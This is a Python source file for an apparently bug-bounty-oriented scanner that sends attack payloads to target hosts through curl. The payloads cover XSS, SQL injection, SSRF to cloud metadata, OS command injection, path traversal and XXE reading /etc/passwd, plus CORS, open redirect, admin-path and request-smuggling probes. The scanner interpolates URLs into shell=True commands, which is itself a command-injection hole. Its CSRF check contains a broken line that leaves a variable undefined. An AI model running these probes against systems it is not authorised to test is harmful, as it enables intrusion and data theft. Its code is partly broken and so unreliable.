#!/usr/bin/env python3
"""
Vulnerability Hunter - Automated vulnerability testing based on recon results
Follows the bug bounty template methodology
"""

import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List
from urllib.parse import urlparse

SCRIPT_DIR = Path(__file__).parent
CONFIG_PATH = SCRIPT_DIR / "config.json"


def load_config() -> dict:
    return json.loads(CONFIG_PATH.read_text())


def run_cmd(cmd: str, timeout: int = 60) -> tuple:
    """Run shell command"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", 1
    except Exception as e:
        return "", str(e), 1


class VulnHunter:
    def __init__(self, target: str, recon_dir: str, output_dir: str, config: dict):
        self.target = target
        self.recon_dir = Path(recon_dir)
        self.output_dir = Path(output_dir) / target / "findings"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.config = config.get("hunting", {})
        self.findings = []
        self.recon_data = self._load_recon()

    def _load_recon(self) -> dict:
        """Load recon results"""
        recon_file = self.recon_dir / "recon_results.json"
        if recon_file.exists():
            return json.loads(recon_file.read_text())
        return {}

    def hunt_all(self) -> List[Dict]:
        """Run all vulnerability checks"""
        print(f"\n{'='*60}")
        print(f"[*] HUNTING: {self.target}")
        print(f"{'='*60}\n")

        live_hosts = self.recon_data.get("live_hosts", [])
        interesting_urls = self.recon_data.get("interesting_urls", [])

        if not live_hosts and not interesting_urls:
            print("[!] No live targets from recon, skipping")
            return []

        # Get base URLs
        base_urls = set()
        for host in live_hosts:
            if host.startswith("http"):
                base_urls.add(host)
            else:
                base_urls.add(f"https://{self.target}")

        # Run checks per vuln class
        vuln_classes = self.config.get("vuln_classes", [])

        for vuln_class in vuln_classes:
            print(f"\n[Phase] Testing: {vuln_class}")
            try:
                method = getattr(self, f"check_{vuln_class}", None)
                if method:
                    method(base_urls, interesting_urls)
                else:
                    print(f"  [!] No checker for {vuln_class}")
            except Exception as e:
                print(f"  [!] Error in {vuln_class}: {e}")

        # Save findings
        if self.findings:
            findings_file = self.output_dir / "findings.json"
            findings_file.write_text(json.dumps(self.findings, indent=2))
            print(f"\n[*] {len(self.findings)} findings saved to {findings_file}")

        return self.findings

    def _add_finding(self, vuln_class: str, title: str, url: str, severity: str,
                     evidence: str, description: str = "", remediation: str = ""):
        """Add a finding"""
        finding = {
            "id": f"BB-{datetime.now().strftime('%Y%m%d%H%M%S')}-{len(self.findings)+1:03d}",
            "vuln_class": vuln_class,
            "title": title,
            "url": url,
            "severity": severity,
            "evidence": evidence,
            "description": description,
            "remediation": remediation,
            "found_at": datetime.now().isoformat(),
            "target": self.target,
            "validated": False,
        }
        self.findings.append(finding)
        print(f"  [!] FINDING: [{severity}] {title}")
        print(f"      URL: {url}")
        return finding

    # ─── Vulnerability Checks ────────────────────────────────────────

    def check_info_disclosure(self, base_urls: set, interesting_urls: list):
        """Check for information disclosure"""
        print("  [*] Checking info disclosure...")

        # Check security headers
        for url in list(base_urls)[:2]:
            out, err, rc = run_cmd(f"curl -sI -m 10 '{url}'")
            if rc == 0:
                headers = out.lower()

                # Missing security headers
                missing = []
                for header in ["x-frame-options", "x-content-type-options", "strict-transport-security",
                               "content-security-policy", "x-xss-protection"]:
                    if header not in headers:
                        missing.append(header)

                if missing:
                    self._add_finding(
                        "info_disclosure",
                        f"Missing Security Headers ({len(missing)})",
                        url, "P4",
                        f"Missing: {', '.join(missing)}",
                        "Multiple security headers are missing, which could enable attacks like clickjacking, MIME sniffing, etc.",
                        "Add the missing security headers to the HTTP response"
                    )

                # Server version disclosure
                for header in ["server", "x-powered-by", "x-aspnet-version", "x-runtime"]:
                    if header in headers:
                        header_line = [l for l in out.splitlines() if l.lower().startswith(header)]
                        if header_line:
                            self._add_finding(
                                "info_disclosure",
                                f"Server Version Disclosure ({header})",
                                url, "P5",
                                header_line[0],
                                f"Server technology version is disclosed in {header} header",
                                f"Remove or genericize the {header} header"
                            )

        # Check for error pages with stack traces
        for url in base_urls:
            for path in ["/nonexistent", "/%00", "/..%00"]:
                out, err, rc = run_cmd(f"curl -s -m 5 '{url}{path}'")
                if rc == 0 and out:
                    indicators = ["stack trace", "traceback", "exception", "at line", "file:"]
                    for indicator in indicators:
                        if indicator.lower() in out.lower():
                            self._add_finding(
                                "info_disclosure",
                                "Stack Trace / Error Disclosure",
                                f"{url}{path}", "P3",
                                out[:500],
                                "Application reveals stack traces or detailed error messages",
                                "Implement custom error handling, disable debug mode in production"
                            )
                            break

    def check_cors(self, base_urls: set, interesting_urls: list):
        """Check for CORS misconfiguration"""
        print("  [*] Checking CORS...")
        evil_origins = ["https://evil.com", "https://attacker.com", "null"]

        for url in list(base_urls)[:3]:
            for origin in evil_origins:
                out, err, rc = run_cmd(
                    f"curl -sI -m 5 -H 'Origin: {origin}' '{url}'"
                )
                if rc == 0:
                    out_lower = out.lower()
                    if "access-control-allow-origin" in out_lower:
                        # Check if origin is reflected
                        for line in out.splitlines():
                            if "access-control-allow-origin" in line.lower():
                                if origin in line or "*" in line:
                                    if origin == "null" and "null" in line:
                                        self._add_finding(
                                            "cors", "CORS Null Origin Allowed",
                                            url, "P3",
                                            line.strip(),
                                            "CORS allows null origin, which can be exploited via sandboxed iframe",
                                            "Remove null from allowed CORS origins"
                                        )
                                    elif "*" in line:
                                        # Check if credentials allowed
                                        if "access-control-allow-credentials" in out_lower:
                                            self._add_finding(
                                                "cors", "CORS Wildcard with Credentials",
                                                url, "P2",
                                                out[:300],
                                                "CORS allows all origins with credentials, enabling data theft",
                                                "Restrict CORS to specific trusted origins"
                                            )
                                    elif origin in line:
                                        self._add_finding(
                                            "cors", "CORS Origin Reflection",
                                            url, "P3",
                                            line.strip(),
                                            f"CORS reflects arbitrary origin: {origin}",
                                            "Implement origin whitelist instead of reflecting"
                                        )

    def check_xss(self, base_urls: set, interesting_urls: list):
        """Check for XSS vulnerabilities"""
        print("  [*] Checking XSS...")
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            "{{7*7}}",
            "${7*7}",
        ]

        # Test reflected XSS on URLs with parameters
        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                # Has parameters, test each
                out, err, rc = run_cmd(f"curl -s -m 5 '{url}'")
                if rc == 0 and out:
                    for payload in xss_payloads[:2]:
                        test_url = url
                        for param in parsed.query.split("&"):
                            if "=" in param:
                                key = param.split("=")[0]
                                test_url = test_url.replace(f"{key}=", f"{key}={payload}")

                        out2, err2, rc2 = run_cmd(f"curl -s -m 5 '{test_url}'")
                        if rc2 == 0 and payload in out2 and "<script>" in out2:
                            self._add_finding(
                                "xss", "Reflected XSS",
                                test_url, "P3",
                                f"Payload reflected: {payload}",
                                "User input is reflected without sanitization",
                                "Implement output encoding and CSP headers"
                            )
                            break

    def check_sqli(self, base_urls: set, interesting_urls: list):
        """Check for SQL injection"""
        print("  [*] Checking SQLi...")
        sqli_payloads = [
            "'",
            "' OR '1'='1",
            "1' ORDER BY 1--",
            "' UNION SELECT NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
        ]
        sqli_indicators = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "syntax error", "unclosed quotation", "unterminated",
            "Microsoft OLE DB", "ODBC SQL Server", "ORA-",
        ]

        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for payload in sqli_payloads[:3]:
                    test_url = url
                    for param in parsed.query.split("&"):
                        if "=" in param:
                            key = param.split("=")[0]
                            test_url = test_url.replace(f"{key}=", f"{key}={payload}")

                    out, err, rc = run_cmd(f"curl -s -m 5 '{test_url}'")
                    if rc == 0 and out:
                        for indicator in sqli_indicators:
                            if indicator.lower() in out.lower():
                                self._add_finding(
                                    "sqli", "Possible SQL Injection",
                                    test_url, "P1",
                                    f"Indicator: {indicator}\nPayload: {payload}\nResponse: {out[:300]}",
                                    "SQL error messages indicate potential injection point",
                                    "Use parameterized queries, disable detailed error messages"
                                )
                                break

    def check_ssrf(self, base_urls: set, interesting_urls: list):
        """Check for SSRF"""
        print("  [*] Checking SSRF...")
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0x7f000001",
            "http://0177.0.0.1",
        ]

        # Look for URL parameters
        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        # Check if param accepts URLs
                        if any(kw in key.lower() for kw in ["url", "uri", "link", "src", "redirect", "next", "return", "callback"]):
                            for payload in ssrf_payloads[:2]:
                                test_url = url.replace(f"{key}={val}", f"{key}={payload}")
                                out, err, rc = run_cmd(f"curl -s -m 10 '{test_url}'")
                                if rc == 0 and out:
                                    ssrf_indicators = ["ami-", "instance-id", "root:", "localhost"]
                                    for indicator in ssrf_indicators:
                                        if indicator in out:
                                            self._add_finding(
                                                "ssrf", "Server-Side Request Forgery",
                                                test_url, "P1",
                                                f"Indicator: {indicator}\nResponse: {out[:300]}",
                                                "Server fetches user-supplied URLs, potentially accessing internal resources",
                                                "Implement URL validation and block internal IP ranges"
                                            )
                                            break

    def check_open_redirect(self, base_urls: set, interesting_urls: list):
        """Check for open redirect"""
        print("  [*] Checking open redirect...")
        evil_url = "https://evil.com"

        for url in list(interesting_urls)[:20]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        if any(kw in key.lower() for kw in ["redirect", "return", "next", "url", "goto", "continue", "dest", "destination"]):
                            test_url = url.replace(f"{key}={val}", f"{key}={evil_url}")
                            out, err, rc = run_cmd(
                                f"curl -sI -m 5 -L --max-redirs 0 '{test_url}'"
                            )
                            if rc == 0 and evil_url in out:
                                self._add_finding(
                                    "open_redirect", "Open Redirect",
                                    test_url, "P3",
                                    f"Redirects to: {evil_url}",
                                    "Application redirects to user-supplied URL without validation",
                                    "Implement redirect destination whitelist"
                                )

    def check_idor(self, base_urls: set, interesting_urls: list):
        """Check for IDOR indicators"""
        print("  [*] Checking IDOR indicators...")
        # Look for numeric IDs in URLs
        import re
        id_pattern = re.compile(r'[/=](\d{1,10})(?:/|$|&|\?)')

        for url in list(interesting_urls)[:20]:
            matches = id_pattern.findall(url)
            if matches:
                for id_val in matches:
                    # Try incrementing/decrementing
                    new_id = str(int(id_val) + 1)
                    test_url = url.replace(f"/{id_val}/", f"/{new_id}/").replace(f"={id_val}&", f"={new_id}&")

                    out1, _, rc1 = run_cmd(f"curl -s -m 5 '{url}'")
                    out2, _, rc2 = run_cmd(f"curl -s -m 5 '{test_url}'")

                    if rc1 == 0 and rc2 == 0 and out1 and out2:
                        # If both return 200 with different data, potential IDOR
                        if len(out2) > 100 and out1 != out2:
                            self._add_finding(
                                "idor", "Potential IDOR - Sequential ID Access",
                                url, "P2",
                                f"Original ID: {id_val}, Test ID: {new_id}\nBoth returned valid responses",
                                "Sequential resource IDs may allow unauthorized access to other users' data",
                                "Use UUIDs or implement proper authorization checks"
                            )

    def check_csrf(self, base_urls: set, interesting_urls: list):
        """Check for missing CSRF protection"""
        print("  [*] Checking CSRF...")
        for url in list(base_urls)[:3]:
            # Check forms for CSRF tokens
            out, err, run_cmd(f"curl -s -m 5 '{url}'")
            if out:
                # Look for forms without CSRF tokens
                import re
                forms = re.findall(r'<form[^>]*>(.*?)</form>', out, re.DOTALL | re.IGNORECASE)
                for form in forms:
                    if 'method="post"' in form.lower() or "method='post'" in form.lower():
                        csrf_patterns = ['csrf', 'token', '_token', 'authenticity_token', 'nonce', '__RequestVerificationToken']
                        has_csrf = any(pattern.lower() in form.lower() for pattern in csrf_patterns)
                        if not has_csrf:
                            self._add_finding(
                                "csrf", "Missing CSRF Token in POST Form",
                                url, "P3",
                                f"Form without CSRF protection found",
                                "POST form lacks CSRF token, enabling cross-site request forgery",
                                "Add CSRF tokens to all state-changing forms"
                            )

    def check_auth_bypass(self, base_urls: set, interesting_urls: list):
        """Check for authentication bypass"""
        print("  [*] Checking auth bypass...")
        admin_paths = [
            "/admin", "/admin/", "/administrator",
            "/dashboard", "/panel", "/manage",
            "/api/admin", "/api/v1/admin",
            "/internal", "/debug", "/console",
            "/actuator", "/actuator/env",
            "/.env", "/config",
        ]

        for url in list(base_urls)[:2]:
            base = url.rstrip("/")
            for path in admin_paths:
                out, err, rc = run_cmd(f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 '{base}{path}'")
                code = out.strip().strip("'")
                if code == "200":
                    # Check if it's actually admin content
                    body, _, _ = run_cmd(f"curl -s -m 5 '{base}{path}'")
                    admin_indicators = ["admin", "dashboard", "management", "control panel", "settings"]
                    if any(ind in body.lower() for ind in admin_indicators):
                        self._add_finding(
                            "auth_bypass", "Admin Panel Accessible Without Auth",
                            f"{base}{path}", "P2",
                            f"HTTP {code}: Admin page accessible\nBody snippet: {body[:200]}",
                            "Administrative interface is accessible without authentication",
                            "Implement authentication on admin endpoints, restrict by IP"
                        )

    def check_race_condition(self, base_urls: set, interesting_urls: list):
        """Check for race condition indicators"""
        print("  [*] Checking race conditions...")
        # Look for state-changing endpoints
        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key = param.split("=")[0].lower()
                        if any(kw in key for kw in ["quantity", "amount", "transfer", "redeem", "apply", "vote"]):
                            # Rapid fire same request
                            import concurrent.futures
                            responses = []

                            def fire_request():
                                out, _, rc = run_cmd(f"curl -s -m 3 '{url}'")
                                return (out[:100], rc)

                            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                                futures = [executor.submit(fire_request) for _ in range(5)]
                                responses = [f.result() for f in concurrent.futures.as_completed(futures)]

                            # If all succeed, potential race condition
                            success_count = sum(1 for _, rc in responses if rc == 0)
                            if success_count == 5:
                                self._add_finding(
                                    "race_condition", "Potential Race Condition",
                                    url, "P3",
                                    f"All {success_count}/5 concurrent requests succeeded",
                                    "State-changing endpoint may be vulnerable to race conditions",
                                    "Implement idempotency keys and proper locking"
                                )
                                break

    def check_business_logic(self, base_urls: set, interesting_urls: list):
        """Check for business logic flaws"""
        print("  [*] Checking business logic...")
        # Check for negative values in parameters
        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        try:
                            num = float(val)
                            if num > 0:
                                # Try negative
                                neg_url = url.replace(f"{key}={val}", f"{key}=-{val}")
                                out, _, rc = run_cmd(f"curl -s -m 5 '{neg_url}'")
                                if rc == 0 and out and "error" not in out.lower()[:100]:
                                    self._add_finding(
                                        "business_logic", "Negative Value Accepted",
                                        neg_url, "P3",
                                        f"Original: {val}, Negative: -{val}\nResponse: {out[:200]}",
                                        "Application accepts negative values, potentially enabling credit/payment manipulation",
                                        "Validate that numeric inputs are within expected positive ranges"
                                    )
                        except ValueError:
                            pass

    def check_file_upload(self, base_urls: set, interesting_urls: list):
        """Check for unrestricted file upload"""
        print("  [*] Checking file upload...")
        upload_paths = ["/upload", "/api/upload", "/file/upload", "/api/v1/upload", "/attachments"]

        for url in list(base_urls)[:2]:
            base = url.rstrip("/")
            for path in upload_paths:
                # Check if upload endpoint exists
                out, err, rc = run_cmd(f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 '{base}{path}'")
                code = out.strip().strip("'")
                if code in ("200", "405"):  # 405 = Method Not Allowed (endpoint exists)
                    # Try uploading a test file
                    test_content = "TEST_UPLOAD_PROBE"
                    out2, err2, rc2 = run_cmd(
                        f"curl -s -m 10 -X POST '{base}{path}' "
                        f"-F 'file=@/dev/null;filename=test.txt' "
                        f"-F 'data={test_content}'"
                    )
                    if rc2 == 0 and out2:
                        self._add_finding(
                            "file_upload", "File Upload Endpoint Found",
                            f"{base}{path}", "P3",
                            f"Upload endpoint responded: {out2[:200]}",
                            "File upload endpoint detected, needs manual testing for unrestricted upload",
                            "Implement file type validation, size limits, and content scanning"
                        )

    def check_command_injection(self, base_urls: set, interesting_urls: list):
        """Check for OS command injection"""
        print("  [*] Checking command injection...")
        cmd_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("$(id)", "uid="),
            ("`id`", "uid="),
            (";cat /etc/passwd", "root:"),
            ("|cat /etc/passwd", "root:"),
            (";sleep 5", None),
        ]

        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        for payload, indicator in cmd_payloads[:4]:
                            test_url = url.replace(f"{key}={val}", f"{key}={val}{payload}")
                            start = time.time()
                            out, _, rc = run_cmd(f"curl -s -m 10 '{test_url}'")
                            elapsed = time.time() - start

                            if rc == 0 and out and indicator and indicator in out:
                                self._add_finding(
                                    "command_injection", "OS Command Injection",
                                    test_url, "P1",
                                    f"Payload: {payload}\nIndicator: {indicator}\nResponse: {out[:300]}",
                                    "User input is passed to OS command without sanitization",
                                    "Use parameterized APIs, never pass user input to shell commands"
                                )
                                return

    def check_path_traversal(self, base_urls: set, interesting_urls: list):
        """Check for path traversal / LFI"""
        print("  [*] Checking path traversal...")
        traversal_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
            ("..%252f..%252f..%252fetc/passwd", "root:"),
            ("/etc/passwd%00", "root:"),
            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ]

        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        # Check if param looks like a file path
                        if any(kw in key.lower() for kw in ["file", "path", "page", "include", "template", "doc", "load"]):
                            for payload, indicator in traversal_payloads[:3]:
                                test_url = url.replace(f"{key}={val}", f"{key}={payload}")
                                out, _, rc = run_cmd(f"curl -s -m 5 '{test_url}'")
                                if rc == 0 and out and indicator in out:
                                    self._add_finding(
                                        "path_traversal", "Path Traversal / LFI",
                                        test_url, "P1",
                                        f"Payload: {payload}\nIndicator: {indicator}\nResponse: {out[:300]}",
                                        "File path parameter allows directory traversal",
                                        "Validate and sanitize file paths, use chroot/jail, block ../ sequences"
                                    )
                                    return

    def check_ssti(self, base_urls: set, interesting_urls: list):
        """Check for Server-Side Template Injection"""
        print("  [*] Checking SSTI...")
        ssti_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{config}}", "SECRET"),
            ("{{self.__class__.__mro__}}", "object"),
        ]

        for url in list(interesting_urls)[:10]:
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        key, val = param.split("=", 1)
                        for payload, indicator in ssti_payloads[:2]:
                            test_url = url.replace(f"{key}={val}", f"{key}={payload}")
                            out, _, rc = run_cmd(f"curl -s -m 5 '{test_url}'")
                            if rc == 0 and out and indicator in out:
                                self._add_finding(
                                    "ssti", "Server-Side Template Injection",
                                    test_url, "P1",
                                    f"Payload: {payload}\nIndicator: {indicator}\nResponse: {out[:300]}",
                                    "User input is evaluated as template expression",
                                    "Use sandboxed template engine, never render user input as template"
                                )
                                return

    def check_xxe(self, base_urls: set, interesting_urls: list):
        """Check for XML External Entity injection"""
        print("  [*] Checking XXE...")
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

        for url in list(base_urls)[:3]:
            # Check if endpoint accepts XML
            out, _, rc = run_cmd(
                f"curl -s -m 5 -X POST '{url}' -H 'Content-Type: application/xml' -d '{xxe_payload}'"
            )
            if rc == 0 and out and "root:" in out:
                self._add_finding(
                    "xxe", "XML External Entity Injection",
                    url, "P1",
                    f"XXE payload executed, /etc/passwd leaked:\n{out[:300]}",
                    "XML parser processes external entities, allowing file read and SSRF",
                    "Disable DTD processing and external entities in XML parser"
                )
                return

    def check_subdomain_takeover(self, base_urls: set, interesting_urls: list):
        """Check for subdomain takeover via CNAME"""
        print("  [*] Checking subdomain takeover...")
        try:
            out, _, rc = run_cmd(f"dig CNAME {self.target} +short", timeout=10)
            if out.strip():
                cname = out.strip().splitlines()[0]
                # Check if CNAME points to cloud services that could be taken over
                takeover_indicators = [
                    "amazonaws.com", "herokuapp.com", "github.io", "azurewebsites.net",
                    "cloudfront.net", "s3.amazonaws.com", "ghost.io", "shopify.com",
                    "surge.sh", "bitbucket.io", "wordpress.com", "pantheon.io",
                    "zendesk.com", "readme.io", "ghost.io", "helpjuice.com",
                    "helpscout.net", "landingi.com", "launchrock.com",
                ]
                for indicator in takeover_indicators:
                    if indicator in cname:
                        # Verify CNAME target is dangling
                        out2, _, rc2 = run_cmd(f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 'https://{cname}'")
                        code = out2.strip().strip("'")
                        if code in ("404", "000", ""):
                            self._add_finding(
                                "subdomain_takeover", "Subdomain Takeover via Dangling CNAME",
                                f"https://{self.target}", "P2",
                                f"CNAME: {self.target} -> {cname}\nTarget returns {code}",
                                f"CNAME points to {cname} which is not claimed, enabling subdomain takeover",
                                "Remove dangling CNAME records, reclaim the cloud resource, or point to owned infrastructure"
                            )
                            return
        except:
            pass

    def check_http_smuggling(self, base_urls: set, interesting_urls: list):
        """Check for HTTP request smuggling"""
        print("  [*] Checking HTTP smuggling...")
        for url in list(base_urls)[:2]:
            # CL.TE smuggling test
            smuggle_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"X"
            )
            out, _, rc = run_cmd(
                f"curl -s -m 5 -H 'Transfer-Encoding: chunked' -H 'Content-Length: 5' "
                f"-X POST '{url}' -d '0\r\n\r\nX'"
            )
            # Check for differential responses
            if rc == 0:
                out2, _, rc2 = run_cmd(f"curl -s -m 5 '{url}'")
                if out != out2 and out and out2:
                    self._add_finding(
                        "http_smuggling", "Potential HTTP Request Smuggling",
                        url, "P2",
                        f"Differential responses detected with CL/TE headers",
                        "Server may be vulnerable to HTTP request smuggling via conflicting Content-Length and Transfer-Encoding",
                        "Reject requests with both Content-Length and Transfer-Encoding headers"
                    )
                    return


def run_hunt(target: str, recon_dir: str = None, output_dir: str = None, config: dict = None) -> List[Dict]:
    """Main entry point"""
    if config is None:
        config = load_config()
    if output_dir is None:
        output_dir = config["paths"]["output_base"]
    if recon_dir is None:
        recon_dir = Path(output_dir) / target / "recon"

    hunter = VulnHunter(target, str(recon_dir), output_dir, config)
    return hunter.hunt_all()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Bug Bounty Vulnerability Hunter")
    parser.add_argument("target", help="Target domain")
    parser.add_argument("--recon-dir", help="Recon output directory")
    parser.add_argument("--output", "-o", help="Output directory")
    args = parser.parse_args()

    config = load_config()
    findings = run_hunt(args.target, args.recon_dir, args.output, config)
    print(f"\n[*] Total findings: {len(findings)}")
